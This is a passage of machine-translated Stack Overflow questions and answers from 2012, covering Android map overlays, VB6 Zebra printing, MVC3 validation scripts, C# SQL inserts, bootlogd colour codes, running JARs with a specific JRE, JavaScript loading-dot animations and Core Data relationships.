                e.printStackTrace();
            }
        }
    };

    // Desabilita a exibição do loading
    routeHttpObj.setDisplayDialog(false);

    // Executa a requisição
    routeHttpObj.execute();
} 
```

绘制路线覆盖的类

```
public class RoadOverlay extends Overlay {
private ArrayList<GeoPoint> pointList;

public RoadOverlay(ArrayList<GeoPoint> pointList) {
    this.pointList = pointList;
}

@Override
public void draw(Canvas canvas, MapView mapView, boolean shadow) {
    Point current = new Point();
    Path path = new Path();
    Projection projection = mapView.getProjection();
    Iterator<GeoPoint> iterator = pointList.iterator();

    if (iterator.hasNext()) {
        projection.toPixels(iterator.next(), current);
        path.moveTo((float) current.x, (float) current.y);
    } else {
        return;
    }

    while(iterator.hasNext()) {
        projection.toPixels(iterator.next(), current);
        path.lineTo((float) current.x, (float) current.y);
    }

    Paint pathPaint = new Paint();
    pathPaint.setAntiAlias(true);
    pathPaint.setStrokeWidth(8.0f);
    pathPaint.setColor(Color.argb(64, 0, 0, 255));
    pathPaint.setStyle(Style.STROKE);
    canvas.drawPath(path, pathPaint);
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:12:19.550

在您的内部创建一个方法`itemized overlay class`并将该方法放入`populate();`该方法并使用逐项类的实例调用该方法。

在 Itemized 类中

```
void populateNow()
{
    populate();
} 
```

如下调用

```
mItemized.populateNow(); 
```

# windows-7 - VB6 在 Windows 7 上通过网络打印到 Zebra 打印机

> ID：10757814
> 
> 赞同：1
> 
> 时间：2012-05-25T16:05:28.633
> 
> 标签：windows-7, printing, vb6

我继承了将运输标签打印到 Zebra s600 打印机的代码，虽然该代码在 Windows XP 中运行良好，但我不明白为什么它在 Windows 7 中无法运行。

在 Windows 7 中运行程序时出现以下错误：“运行时错误 '75' 路径/文件访问错误”

但是它运行在WindowsXP中，所以路径没有错。

编辑：我尝试在可比较模式下运行以及右键单击并以管理员身份运行程序。还是不行。

```
Sub PrintLabel()
'**** this sub print a barcode label on the Zebra S600 printer
'**** for the cardboard shipping box.
Dim mySNprinter As String

mySNprinter = GetSetupVariable("TestSnPrinter")

If (mySNprinter = "") Then
    mySNprinter = "\\dc1\bertha"
End If

 Open mySNprinter For Output As #3
    Print #3, "^XA"         'start of data
    Print #3, "^LH20,25"    'home position of label is 5,25
    If optSize(0).Value = True Then
        Print #3, "^FO1,30^A0,N,25,25^FD" & cboLabel.Text & "^FS"    'print MP-1 with the D font
    End If
    If optSize(1).Value = True Then
        Print #3, "^FO1,30^A0,N,35,35^FD" & cboLabel.Text & "^FS"    'print MP-1 with the D font
    End If
    If optSize(2).Value = True Then
        Print #3, "^FO1,30^A0,N,50,50^FD" & cboLabel.Text & "^FS"    'print MP-1 with the D font
    End If
    Print #3, "^XZ"                     'end data
 Close #3 
```

# c# - 新鲜的 MVC 3 项目给了我奇怪的不显眼的验证脚本错误

> ID：10757817
> 
> 赞同：3
> 
> 时间：2012-05-25T16:05:55.157
> 
> 标签：c#, javascript, asp.net-mvc-3, .net-4.0, unobtrusive-validation

我刚刚创建了一个新的 MVC 3 项目并使用包管理器更新了所有已安装的包，但是我收到以下错误：

> Microsoft JScript 运行时错误：无法设置属性“unobtrusive”的值：对象为空或未定义

以下是相关代码：

```
<!DOCTYPE html>

<html lang="en">
    <head>
        <meta charset="utf-8" />
        <title>@ViewBag.Title</title>

        <link href="@Url.Content("~/Content/Reset.css")" rel="stylesheet" type="text/css" />
        <link href="@Url.Content("~/Content/Site.css")" rel="stylesheet" type="text/css" />

        <script src="@Url.Content("~/Scripts/modernizr-1.7.min.js")" type="text/javascript"></script>

        <script src="@Url.Content("~/Scripts/jquery-1.7.2.min.js")" type="text/javascript"></script>
        <script src="@Url.Content("~/Scripts/jquery-ui-1.8.20.min.js")" type="text/javascript"></script>

        <script src="@Url.Content("~/Scripts/jquery.unobtrusive-ajax.min.js")" type="text/javascript"></script>
        <script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.js")" type="text/javascript"></script>
    </head>

    <body>
        @RenderBody()
    </body>
</html> 
```

来自发生错误的区域的 javascript 片段：

```
$jQval.unobtrusive = {
        adapters: [],

        parseElement: function (element, skipAttach) {
            /// <summary>
            /// Parses a single HTML element for unobtrusive validation attributes.
            /// </summary>
            /// <param name="element" domElement="true">The HTML element to be parsed.</param>
            /// <param name="skipAttach" type="Boolean">[Optional] true to skip attaching the
            /// validation to the form. If parsing just this single element, you should specify true.
            /// If parsing several elements, you should specify false, and manually attach the validation
            /// to the form when you are finished. The default is false.</param>
            var $element = $(element),
                form = $element.parents("form")[0],
                valInfo, rules, messages;

            if (!form) {  // Cannot do client-side validation without a form
                return;
            }... 
```

有人可以告诉我为什么会发生此错误以及如何解决吗？我只是缺少对所需脚本的引用吗？

谢谢，亚历克斯。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-25T16:09:46.570

你应该包括`jquery.validate.js`之前`jquery.validate.unobtrusive.js`

```
 <script src="@Url.Content("~/Scripts/jquery.validate.js")" type="text/javascript"></script>
    <script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.js")" type="text/javascript"></script> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T16:07:40.283

您还需要包含 JQuery Validate 脚本

# c# - C# 以列表为参数插入 SQL 表

> ID：10757818
> 
> 赞同：1
> 
> 时间：2012-05-25T16:05:57.027
> 
> 标签：c#, .net, sql-server-2008, generics

在这个精彩论坛中专家的真诚帮助下，我已经能够解析 SharePoint 列表返回的 xml，从而将所需的列表项放入 C# 列表中。

```
XDocument xdoc = XDocument.Parse(activeItemData.InnerXml);
XNamespace z = "#RowsetSchema";

List<int> listID = (from row in xdoc.Descendants(z + "row") 
select (int)row.Attribute("ows_ID")).ToList();

List<string> listTitle = (from row in xdoc.Descendants(z + "row") 
select (string)row.Attribute("ows_LinkTitle")).ToList(); 
```

我创建了一个 SQL 表，我想使用 Lists listID 和 listTitle 作为参数在我的表中插入值

```
System.Data.SqlClient.SqlConnection sqlConnection1 =
            new System.Data.SqlClient.SqlConnection(MyconnectionString);

            System.Data.SqlClient.SqlCommand cmd = new System.Data.SqlClient.SqlCommand();
            cmd.CommandType = System.Data.CommandType.Text;
            cmd.CommandText = "INSERT TechOpsProjectTracker (ID, [Project Name]) VALUES (@ID, @ProjectName)";

//What I want to do:
            //1\. @ID should get the values from the List listID: List<int> listID = (from row in xdoc.Descendants(z + "row") select (int)row.Attribute("ows_ID")).ToList();
            //2\. @ProjectName should get the values from the List listTitle: List<string> listTitle = (from row in xdoc.Descendants(z + "row") select (string)row.Attribute("ows_LinkTitle")).ToList();
            //3\. so each new record inserted in the table has ID and its corresponding Project Name. Something like this
            /* ID    Project Name
               360   GEI Survey data to Sharepoint
               378   Create back end and environment to support User demographic reporting

             */ 
```

可能还有其他一些可能更简单的方法来完成我的工作。请告诉我。TIA。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:23:49.000

在将列表作为参数插入时，您可以尝试使用表值参数。它类似于执行批量插入或使用临时表执行 SELECT INTO。

[http://msdn.microsoft.com/en-us/library/bb675163.aspx](http://msdn.microsoft.com/en-us/library/bb675163.aspx)

[如何从.net代码将表值参数传递给存储过程](https://stackoverflow.com/questions/5595353/how-to-pass-table-value-parameters-to-stored-procedure-from-net-code)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T17:14:21.497

设置类似的用户定义类型。

```
CREATE TYPE [dbo].[tableOf_Ints] AS TABLE(
    [ID] [int] NULL
)
GO 
```

然后你可以像这样使用它。

```
public static SqlCommand CreateCommand(List<int> ints)
{
    var dt = new DataTable();
    dt.Columns.Add("ID",typeof(Int32));
    for (int i = 0; i < ints.Count; i++)
    {
        dt.Rows.Add(ints[i]);
    }

    SqlCommand cmd = new SqlCommand("SomeStoredProc");
    cmd.CommandType = CommandType.StoredProcedure;
    cmd.CommandTimeout = 120;
    var param1 = cmd.Parameters.AddWithValue("@SomeParam", dt);
    param1.SqlDbType = SqlDbType.Structured;
    param1.TypeName = "dbo.tableOf_Ints";

    return cmd;
} 
```

假设你有一个这样的存储过程。

```
CREATE PROCEDURE [dbo].[SomeStoredProc]  
    @SomeParam TableOf_Ints READONLY
AS
BEGIN
END 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T16:24:50.323

如果您使用的是 Sql Server 2008，您可以将表传递给您的存储过程并执行基于集合的更新/插入。这消除了您添加的许多复杂性。

[http://msdn.microsoft.com/en-us/library/bb510489.aspx](http://msdn.microsoft.com/en-us/library/bb510489.aspx) 和[Ado.Net 链接](http://msdn.microsoft.com/en-us/library/bb675163.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-25T16:46:07.517

```
cmd.CommandText = "INSERT TechOpsProjectTracker (ID, [Project Name]) VALUES (@ID, @ProjectName)";    
Dictionary<int, string> dt = new Dictionary();
    for (int i=0; i<ListId.Count; i++)
    {
    dt.Add(ListID[i], ListTitle[i]);
    }

    foreach (KeyValuePair<int, string> pair in dt)
    {
       SqlParameter a = cmd.Parameters.Add("@ID", SqlDbType.Int);

       // or write what is the type of your column in your table after SqlDbType. 

       a.Value = pair.key;

       SqlParameter b = cmd.Parameters.Add("@Project", SqlDbType.Varchar, 50);

        // 50 is what you gave max length to your db column//

        b.Value = pair.value;

        int v = cmd.ExecuteNonQuery();

        if ( v == 1 )
        {
           MessageBox.Show("Successfully Done !");
        }

        else
        {
           MessageBox.Show("Oops ! I can' t insert Successfully")
        }
    } 
```

或者您可以直接通过 AddinParameter func 或 AddwithValue 函数将 ListID[0] 传递给您的查询文本

```
cmd.CommandText = "INSERT TechOpsProjectTracker (ID, [Project Name]) VALUES (@ID, @ProjectName)";

 for (int i=0; i<ListId.Count; i++)
    {
       cmd.Parameters.AddWithValue("@ID", ListID[i]);
       cmd.Parameters.AddWithValue("@Project", ListTitle[i]);
       int result = cmd.ExecuteNonQuery();

       // if you want you can add here the messagebox as the same in first code example
    } 
```

# ajax - 为什么此 dojo 代码会产生“输入意外结束”？

> ID：10757822
> 
> 赞同：0
> 
> 时间：2012-05-25T16:06:22.517
> 
> 标签：ajax, dojo

我正在编写一个简单的 dojo 程序来将文件上传到服务器。但是每次我选择文件时，我都会收到一条错误消息，提示输入意外结束。

```
dojo.require("dojox.form.Uploader");
        //dojo.require("dojox.form.uploader.plugins.Flash");
var f1 = new dojox.form.Uploader({
        url:"/IFixBuildWeb/UploadHandlerServlet/Upload"
        ,multiple:false
        ,label:"selectBtn"
        ,uploadOnSelect: true
        }, "selectBtn");
f1.startup(); 
```

它允许我选择文件，但是在 chrome javascript 控制台中，我收到一条错误消息，提示输入意外结束。

我还没有创建表单，只是制作了一个 html 表，上传者就在其中。上面的代码有什么问题，或者是否有必要制作一个表单并将其 enctype 设置为 multiform/data？

我有一个未触发的 onComplete 事件处理程序。我在 dojo 网站上读到，这通常是因为使用的插件类型与预期从服务器端返回的数据类型不匹配。但我不确定如何检查/确认这一点。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T17:17:23.467

我认为，您需要 HTML5 插件的 HTML 表单。如果你看到 HTML5.js 的源代码，你会看到 ... postCreate: function(){ this.connectForm(); ... Base.js 中的 connectForm 方法使用 HTML 表单。

Flash 和 IFrame - 也许不需要。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-25T12:40:45.467

它只是在 IE 中发生（回退到 Flash 上传模式）还是在所有浏览器中发生？

# linux - 显示带有转义颜色代码的文件 - 来自引导日志守护程序的引导消息

> ID：10757823
> 
> 赞同：13
> 
> 时间：2012-05-25T16:06:27.913
> 
> 标签：linux, ubuntu, terminal, debian

我有一个包含颜色代码的文件：

```
Fri May 25 17:13:04 2012: [....] Starting MTA: exim4^[[?25l^[[?1c^[7^[[1G[^[[32m ok ^[[39;49m^[8^[[?25h^[[?0c.
Fri May 25 17:13:05 2012: [....] Loading cpufreq kernel  modules...^[[?25l^[[?1c^[7^[[1G[^[[32m ok ^[[39;49m^[8^[[?25h^[[?0cdone (acpi-cpufreq). 
```

如何在 linux 终端上显示它的颜色？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-26T06:52:57.767

为了完整起见，包含所有这些转义序列的文件由*bootlogd*守护程序（debian 系列中的引导日志包）生成，该守护程序捕获引导期间发送到控制台的所有彩色消息。在控制台上，这些消息首先显示如下：

```
[....] Starting periodic command scheduler: cron 
```

然后，当执行服务或命令时，转义序列被发送到控制台以将光标重新定位在行首并打印*ok、fail、info、warn*等...

```
[ ok ] Starting periodic command scheduler: cron. 
```

所有这些消息都被*bootlogd*守护进程捕获并写入一个包含所有转义序列（包括重新定位序列）的文件。没有问题，除了`^[`必须用八进制替换`033`才能正确显示文件。但是，因为有一个捕获，守护程序还在消息前面添加一个日期戳，而不改变光标重新定位序列的坐标。因此，*ok*、*fail*等消息会覆盖部分日期戳。不太好。

```
Fri May 25 17:13:01 2012: [....] Starting periodic command scheduler: cron
becomes...
[ ok ay 25 17:13:01 2012: [....] Starting periodic command scheduler: cron. 
```

解决方案是更改光标定位顺序。通过尝试和错误，我发现该序列是`^[1G`. 下面的 sed 命令最终完成了工作：

```
sed 's/\^\[/\o33/g;s/\[1G\[/\[27G\[/' /var/log/boot 
```

bootlogd*守护*程序应在将控制台消息发送到文件之前清除所有转义序列。我们可以称之为错误吗？

这个“错误”也可能存在于所有 Debian 继承者中，如 Ubuntu、Mint 等......

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2015-04-29T09:50:38.003

您可以使用 bash 内置函数：

```
$ echo "$(< /your/file)" 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-09-25T17:09:34.307

所以 ripat 的回答对我不起作用。我在 Debian wiki 上找到了一个替代方案 - [https://wiki.debian.org/bootlogd](https://wiki.debian.org/bootlogd)。

在撰写本文时，这是：

```
sed $'s/\^\[/\E/g' /var/log/boot 
```

对于 bootlogd 版本 <2.88（无日期戳）。对于以后的版本：

```
sed $'s/\^\[/\E/g;s/\[1G\[/\[27G\[/' /var/log/boot 
```

后者完美地格式化了我的日志中除了一行之外的所有内容，只有很小的差异。另请注意，正如该问题的错误报告中所指出的，`$`sed 模式的领先使这些解决方案特定于 bash。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-03-21T14:31:56.630

试试`less -R /your/file`。

我发现`more`默认情况下它确实符合我的预期：它在终端中显示彩色文本。有效的事实`more`，虽然`less`（它是年轻的表弟）并没有让我看`man less`页面。

事实证明，它`less`支持`-R`标志，它将`ESC`序列作为原始控制字符输出。这与您获得的行为相同`more`，加上所有标准的搜索和导航增强功能`less`。

# objective-c - 预先绑定消息以避免方法查找

> ID：10757824
> 
> 赞同：2
> 
> 时间：2012-05-25T16:06:35.700
> 
> 标签：objective-c, message, prebinding

这篇文章[http://www.gnustep.org/resources/ObjCFun.html](http://www.gnustep.org/resources/ObjCFun.html)指出

> 在任何时间很关键的地方，Objective-C 都可以将消息预先绑定到其实现中，从而避免昂贵的消息查找。

您如何进行此预绑定？这与选择器无关，是吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T16:13:13.180

它涉及实现。*考虑以下内容*（如果您获得参考，则 +1 互联网）：

```
NSArray *myReallyLongArrayOf1000items;

for (int i = 0; i < 1000; i++)
    NSLog(@"%@", [myReallyLongArrayOf1000items objectAtIndex:i]); 
```

obj-c 运行时需要时间来准确查找如何执行`-objectAtIndex:`任务。因此，当我们将代码块更改为：

```
NSArray *myReallyLongArrayOf1000items;

id (*objectAtIndex)(NSArray *, SEL, int) = (typeof(objectAtIndex)) [myReallyLongArrayOf1000items methodForSelector:@selector(objectAtIndex:)];

for (int i = 0; i < 1000; i++)
    NSLog(@"%@", objectAtIndex(myReallyLongArrayOf1000items, @selector(objectAtIndex:), i); 
```

这使用了一个 C 函数指针，这比使用 Objective-c 的动态查找**要**快得多，因为它只是调用方法，并且没有额外的运行时代码。

不利的一面是，这很快使代码难以阅读，因此请谨慎使用，如果有的话。

# android - 启动avd失败，说找不到模拟器，但是存在

> ID：10757828
> 
> 赞同：13
> 
> 时间：2012-05-25T16:06:45.310
> 
> 标签：android, ubuntu, emulation, avd

我已经在 Ubuntu 12.0.4 上安装了 SDK。我启动了 SDK 管理器并更新了几个包。

我运行了 avd 管理器并尝试创建一个 avd，但它失败了，没有任何信息。

然后我尝试从命令行创建 avd，使用我尝试从 gui 使用的相同信息，并且它有效。

当我尝试启动该 AVD 时，它失败了（省略了一些字符串）：

```
Failed to start emulator: Cannot run program "<myhome>/apps/android/android-sdk-linux/tools/emulator": java.io.IOException: error=2, No such file or directory 
```

这是我在查找此文件时看到的内容：

```
$ ls -lt <myhome>/apps/android/android-sdk-linux/tools/emulator
-rwxrwxr-x 1 <me> <me> 24828 May 25 08:20 <myhome>/apps/android/android-sdk-linux/tools/emulator* 
```

如您所见，它正在寻找的路径确实存在。

这里发生了什么？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-06-15T23:52:28.903

好像您正在运行 64 位系统。所以你需要安装ia32-libs。

要安装 ia32-libs，请在终端中输入以下行：

> sudo apt-get install ia32-libs

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-11-21T14:06:20.073

执行以下操作来解决此问题：命令行工具 android (android avd)，并使用 Tools->Manage SDK 安装 64 位模拟器。然后我将模拟器移动到 emulator.old，并将 emulator64-arm 移动到模拟器

使用这种方法无需安装 32 位库。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-07-09T10:00:27.297

如果您使用的是 64 位 Ubuntu 或 Linux，您只需将模拟器重命名为任何其他名称，例如 emulator_backup 和 emulator64-arm 到模拟器，这将起作用。

无需安装 32 位库，这也是一个忙碌的过程。

在 Ubuntu 上享受 Android 开发。

# jasper-reports - 在 Jasper iReport 4.5.0 中，如何获取要保存的图表上的标签掩码？

> ID：10757835
> 
> 赞同：1
> 
> 时间：2012-05-25T16:07:19.807
> 
> 标签：jasper-reports, label, ireport, mask, stackedbarseries

我正在使用 iReport 4.5.0，它比 CF 的错误报告生成器更令人愉快......问题是我可以使用属性侧栏在设计器中设置的一些元素似乎没有编写任何 XML，因此不要保存。

我使用的是堆积条形图，它基本上是一个三变量图，并且值轴标签掩码似乎没有保存。我的掩码是“#.#%”（无引号），它将双打转换成不错的百分比，省去了我自己进行转换的麻烦。

有谁知道堆积条形图中 Value Axis Tick Label Mask 的 XML 标记是什么？如果我可以在 XML 中设置它，我相信它会坚持...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T14:25:56.113

对于多轴图表使用：

```
<axis>

<!-- other XML tags here-->

   <valueAxisFormat>
      <axisFormat tickLabelMask="#.#%"/>
   </valueAxisFormat>
</axis> 
```

对于单轴图表使用：

```
<linePlot>

<!-- other XML tags here-->

   <valueAxisFormat>
      <axisFormat tickLabelMask="#.#%"/>
   </valueAxisFormat>
</linePlot> 
```

# windows - 使用特定 JRE 运行 JAR 文件

> ID：10757851
> 
> 赞同：35
> 
> 时间：2012-05-25T16:08:11.233
> 
> 标签：windows, batch-file, jar, java

Windows 上有没有办法使用位于特定文件夹中的 JRE 运行 JAR 文件？类似于 Eclipse 在您指定的路径中查找其 JRE 的方式。一些 Windows 可执行代码（C 或 C++）或批处理文件都可以完成这项工作。谢谢！

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2012-05-25T16:10:57.537

JRE 目录有一个 bin/java.exe。

您可以简单地从该 JRE 运行一个 jar

```
<path_to_jre>/bin/java.exe -jar Executable.jar 
```

如果您不想每次都打开控制台，只需将上述行放入 .bat 文件并双击它即可。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2018-07-31T14:36:52.143

### 从命令运行

```
<path_to_jre>/bin/java.exe -jar Executable.jar 
```

（或使用 javaw.exe 在启动 JAR 后立即返回命令提示符）

### 或者设置环境变量

许多启动脚本分别尊重变量`JRE_HOME`和`JAVA_HOME`JRE 和 JDK。有些人不喜欢空格，所以使用短路径约定 ( `C:\Progra~1\Java\jre1.8.0_171`)

在 64 位系统上：
`Progra~1`= `Program Files`
`Progra~2`=`Program Files (x86)`

### 或设置文件关联

通过双击启动 JAR。不幸的是，GUI（控制面板\所有控制面板项\默认程序\设置关联）非常糟糕，所以你必须在注册表中进行。

当忽略控制面板设置时，这是我最喜欢选择 32/64 位 JRE 的方法。

1.  检查默认值`HKEY_CLASSES_ROOT\.jar`是否为`jarfile`
2.  检查默认值是否`HKEY_CLASSES_ROOT\jarfile\shell\open\command`指向您的 JRE。

在我的 64 位环境中：

```
"C:\Program Files\Java\jre1.8.0_171\bin\javaw.exe" -jar "%1" %* 
```

注意引号：javaw 路径包含空格；JAR 路径可以包含空格；传递的参数以空格分隔。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2017-02-26T21:49:38.190

在与 jarfile 相同的文件夹中创建此批处理文件：

```
@echo off
set path=C:\Program Files (x86)\java\bin\;%path%
java -version
javaw -jar jaryouwanttorun.jar
pause
exit 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-05-10T07:13:43.927

PowerShell语法如下

```
& 'C:\Program Files\Java\jdk1.7.0_80\bin\java.exe' -jar .\Executable.jar -Xmx256m 
```

使用系统中安装的特定 java.exe 的路径。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-25T16:09:58.053

您可以更改 JAVA_HOME 的 Windows 环境变量（请参阅[此处](https://confluence.atlassian.com/display/DOC/Setting+the+JAVA_HOME+Variable+in+Windows)）。将它指向您希望它运行的 JRE。我确定没有编程方式来做到这一点（因为在运行时加载了正确的 JRE）。

# javascript - 只有一个跨度有效

> ID：10757865
> 
> 赞同：3
> 
> 时间：2012-05-25T16:09:04.417
> 
> 标签：javascript, jquery

这段代码提供了一个点效果，就像一个加载栏（“Loading.,Loading..,Loading...），但问题是，只有一个跨度 ID 有效，第二个无效，我不知道为什么......请帮帮我

```
<SCRIPT LANGUAGE="JavaScript" TYPE="text/javascript">
<!--
function showProgressDots(numberOfDots) {

    var progress = document.getElementById('progressDots');

    switch(numberOfDots) {
        case 1:
            progress.innerHTML = '.';
            timerHandle = setTimeout('showProgressDots(2)',200);
            break;
        case 2:
            progress.innerHTML = '..';
            timerHandle = setTimeout('showProgressDots(3)',200);
            break;
        case 3:
            progress.innerHTML = '...';
            timerHandle = setTimeout('showProgressDots(1)',200);
            break;
    }
}
window.setTimeout('showProgressDots(1)',100);
//-->
</SCRIPT>

Loading<span id="progressDots" style="position:absolute;"></span>
SecondLoading<span id="progressDots" style="position:absolute;"></span> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-25T16:24:52.040

如果您需要，这是简短的解决方案。

*HTML：*

```
Loading<span id="progressDots1"></span>
SecondLoading<span id="progressDots2"></span> 
```

*JavaScript：*

```
function loading(id) {
    var el = document.getElementById(id),
        i = 0,
        dots = "...";

    setInterval(function() {
        el.innerHTML = dots.substring(0, ++i);
        if (i % 3 == 0) i = 0;
    }, 500);
}

loading("progressDots1");
loading("progressDots2");​ 
```

**演示：http:** [//jsfiddle.net/dzFL3/](http://jsfiddle.net/dzFL3/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-25T16:14:35.943

**编辑 1：**编写了一个可自定义的加载器，以便您可以注册/取消注册加载器。见下文，

**编辑 2：**正如 Vision 指出的那样

> 只是出于兴趣......我想，创建多个计时器并将它们存储在数组中有什么意义？如果您等待一段时间，单独的计时器将不同步。这个怎么样：jsfiddle.net/rMpK9/5

**改进的代码：（**来自 Vision 的[DEMO](http://jsfiddle.net/rMpK9/5)和使用`getElementsByTagName`）

```
var timer = null,
    dotLimit = 3,
    elements = [];

function registerProgressDots(progress) {
    for (var i = 0; i < progress.length; i++) {
        elements.push(progress[i]);
    }

    timer = setInterval(function() {
        for (var i = 0; i < elements.length; i++) {
            with(elements[i]) {
                innerHTML = innerHTML.length == dotLimit ? '' : innerHTML + '.';
            }
        }
    }, 200);
}

function unRegisterProgressDots(index, clearDots) {
    if (typeof index == 'undefined' || index == null) {
        clearInterval(timer);
    } else {
        elements.splice(index, 1);
        if (elements.length == 0) {
            clearInterval(timer);
        }
    }

    if (clearDots) {
        var progress = document.getElementsByClassName('progressDots');
        for (var i = 0; i < progress.length; i++) {
            progress[i].innerHTML = '';
        }
    }
}

window.setTimeout(function() {
    var spanTags = document.getElementsByTagName('span');

    var progress = [];
    for (var i = 0; i < spanTags.length; i++) {
        if (spanTags[i].className.indexOf('progressDots') >= 0) {
            progress.push(spanTags[i]);
        }
    }

    registerProgressDots(progress);
}, 100);

window.setTimeout(function() {
    unRegisterProgressDots(null, true);
}, 10000); //stop loading text after 10 seconds 
```

[**最终演示**](http://jsfiddle.net/rMpK9/6/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-25T16:46:19.193

这是我的建议：

```
Loading<span id="progressDots" style="position:absolute;"></span> //element before script

<script type="text/javascript">
var i='', dots=20;

showProgressDots();    
function showProgressDots() {
    var progress = document.getElementById('progressDots');
        progress.innerHTML = i;
    i+='.';
    if (i.length<dots) setTimeout(showProgressDots, 200);
}
</script> 
```

[小提琴](http://jsfiddle.net/adeneo/vFmw8/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-26T14:18:46.990

只是发布一个我为此制作的小插件（*为了它的乐趣..*）。

```
(function($){
    $.fn['progress'] = function(_options){
        var options = {
            symbol: '.',
            delay: 200,
            length: 3,
            duration: 0
        };
        if (typeof _options === 'object'){
            $.extend(options, _options);
        } else if (_options === 'clear'){
            return this.each(function(){
                clear.apply(this);
            });
        }

        function display(){
            var self = $(this),
                txt = self.text() + options.symbol;
            if (txt.length  > options.length){
                txt = '';
            }
            self.text( txt );
        }

        function clear(){
            var self = $(this),
                timer = self.data('progressTimer');

            clearInterval(timer);
            self.text('');
            self.removeData('progressTimer');
        }

        return this.each(function(){
            var self = $(this),
                that = this,
                timer = null;

            timer = setInterval(function(){
                display.apply(that);
            }, options.delay);

            self.data('progressTimer', timer);

            if (options.duration){
                setTimeout(function(){
                        clear.apply(that);
                    }, options.duration);
            }
        });
    }

})(jQuery); 
```

你用它

```
// to set it
$('some-selector').progress({/*options*/});

// to stop it
$('some-selector').progress('clear'); 
```

有可用*`options`*的存在

*   `symbol`每次迭代要添加的字符（*默认为`.`*）
*   `length`重新开始之前要显示的最大符号数（*默认为 3*）
*   `delay`添加每个额外符号所需的时间（*以毫秒为单位*）（*默认为 200*）
*   `duration`清除插件前的总持续时间（*以毫秒为单位）（**默认为 0，表示不自动清除*）

[示例^(指向 jsfiddle)](http://jsfiddle.net/gaby/gh5CD/1/)

```
$('some-selector').progress({
  symbol: '*',
  length: 10,
  delay: 100,
  duration: 5000 
}); 
```

* * *

***更新评论***

要在特定时间后自动清除它，只需在您的代码中添加超时..

所以

```
var progressElements = $('some-selector').progress({/*options*/}); // set the progress
setTimeout(function(){
   progressElements.progress('clear');
 }, 1000); // 1000ms = 1 second 
```

* * *

***更新第二条评论***

更改了上面的插件代码以允许`duration`参数。

如果指定，它声明插件将自动清除的时间。

**[在http://jsfiddle.net/gaby/gh5CD/3/](http://jsfiddle.net/gaby/gh5CD/3/)**演示**（*第二个加载器将在 2 秒后清除*）**

# iphone - 在核心数据中正确存储一对多关系的数据

> ID：10757866
> 
> 赞同：0
> 
> 时间：2012-05-25T16:09:06.213
> 
> 标签：iphone, objective-c, ios, core-data, one-to-many

我在尝试将数据存储在具有一对多关系的核心数据对象中时收到**Cocoa 错误 1570 。**

日志文件中有错误：

```
2012-05-25 12:02:38.919 TestProject[5059:12e03]   DetailedError: {
    NSLocalizedDescription = "The operation couldn\U2019t be completed. (Cocoa error 1570.)";
    NSValidationErrorKey = conversation;
    NSValidationErrorObject = "<Messages: 0x933e190> (entity: Messages; id: 0x933e1d0 <x-coredata:///Messages/tF3A62C22-456B-41EB-B9A4-0BA1E6738A6337> ; data: {\n    conversation = nil;\n    conversationID = nil;\n    createdAt = nil;\n    messageID = nil;\n    nickname = nil;\n    originNetwork = nil;\n    text = nil;\n    timestamp = nil;\n    userImageURL = nil;\n})";
} 
```

具体关系是**Conversations<--->>Messages**，或者一个会话可以有多个消息，每个消息恰好属于一个会话。

在我的模型中，这两个 NSManagedObjects 都是可选的。

我的问题是，如何在**对话中正确存储****消息**对象？

 **我知道它与集合有关，但我还没有正确实施它。

任何和所有特定或抽象的代码片段将不胜感激！

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-26T11:06:15.740

这取决于您是否使用 NSManagedObject 子类。如果你是（我喜欢这样做），你会有一个`ASConversation`and`ASMessage`类（前缀是什么），然后你有 Xcode 为你自动生成它们，你可以使用类似的东西：

```
NSManagedObjectContext *moc;  // exists 
ASConversation *conv = 
    [NSEntityDescription insertNewObjectForEntityForName:@"Conversation" 
                                  inManagedObjectContext:moc];
// … set values on the conv
ASMessage *msg = 
    [NSEntityDescription insertNewObjectForEntityForName:@"Message" 
                                  inManagedObjectContext:moc];
// … set other parts of the message

[conv addMessagesObject:msg]; 
```

如果您正确设置了从`Message`back 到`Conversation`to-one 的反向关系，那么当您发送`save`到`moc`.

如果您没有子类，则必须使用通用方式，恕我直言，这有点痛苦。

```
// Assume conv and msg exist as above, but both are of NSManagedObject types
NSMutableSet *set = [conv mutableSetValueForKey:@"messages"];
// Changes to the above set are managed by Core Data for you.
[set addObject:msg]; 
```

然后像以前一样保存。请检查您是否还为关系设置了可选 - 可可错误 1570 是“未设置强制值” - 但它也可以应用于关系。**

# php - 如何替换嵌套的 switch 语句

> ID：10757867
> 
> 赞同：4
> 
> 时间：2012-05-25T16:09:06.510
> 
> 标签：php, nested, switch-statement, anti-patterns

